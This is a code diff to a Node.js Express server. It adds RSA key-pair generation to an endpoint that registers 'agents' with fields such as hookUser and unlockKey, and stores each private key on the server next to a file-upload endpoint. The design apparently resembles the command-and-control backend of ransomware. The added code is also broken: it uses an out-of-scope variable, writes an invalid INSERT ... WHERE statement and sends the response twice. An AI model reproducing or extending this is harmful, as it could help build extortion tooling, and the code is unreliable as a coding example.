@@ -2,6 +2,7 @@ const express = require('express');
 const mysql = require('mysql');
 const util = require("util");
 const multer = require("multer");
+const crypto = require("crypto");
 const maxSize = 2 * 1024 * 1024;
 
 const app = express();
@@ -55,10 +56,25 @@ app.post('/api/agent/new', (req, res) => {
     req.body.hookUser != undefined &&
     req.body.unlockKey != undefined
   ) {
+
+    // Generate RSA key pair
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
+      modulusLength: 4096,
+      publicKeyEncoding: {
+        type: 'spki',
+        format: 'pem'
+      },
+      privateKeyEncoding: {
+        type: 'pkcs8',
+        format: 'pem'
+      }
+    });
+
     // Insert data into MySQL
     const sql = `INSERT INTO agent (versionOS, hosts, hookUser, unlockKey) VALUES (?, ?, ?, ?)`;
     const values = [req.body.versionOS, req.body.hosts, req.body.hookUser, req.body.unlockKey];
 
+    // Insert data into MySQL without keys
     db.query(sql, values, (err, result) => {
       if (err) {
         JSON_RES.error = { errorMsg: "Error inserting data into MySQL " + err.stack }
@@ -74,6 +90,27 @@ app.post('/api/agent/new', (req, res) => {
       res.json(JSON_RES);
       res.end();
     });
+
+    // Save public and private keys with ID as the key name
+    const publicKeyName = `public_key_${result.insertId}.pem`;
+    const privateKeyValue = privateKey.toString();
+    const privateKeyName = `private_key_${result.insertId}.pem`;
+
+    // Insert keys into MySQL
+    const keySql = `INSERT INTO agent (privKey, pubKey) VALUES (?, ?) WHERE id = ?`;
+    const keyValues = [privateKeyValue, publicKey.toString(), result.insertId];
+    db.query(keySql, keyValues, (err, keyResult) => {
+      if (err) {
+        console.error('Error inserting key into MySQL: ' + err.stack);
+        res.status(500).send('Error inserting key into MySQL');
+        return;
+      }
+      console.log('Inserted key into MySQL with ID ' + keyResult.insertId);
+
+      // Send public key to agent
+      res.status(200).send({ publicKey: publicKey });
+    });
+
   } else {
     JSON_RES.error = { errorMsg: "Bad parameters" }
     res.status(400)
@@ -83,7 +120,7 @@ app.post('/api/agent/new', (req, res) => {
 
 });
 
-// API endpoint for receiving data
+// API endpoint for receiving files
 app.post('/api/file/upload', async (req, res) => {
   var JSON_RES = { data: {}, error: {} }
   try {
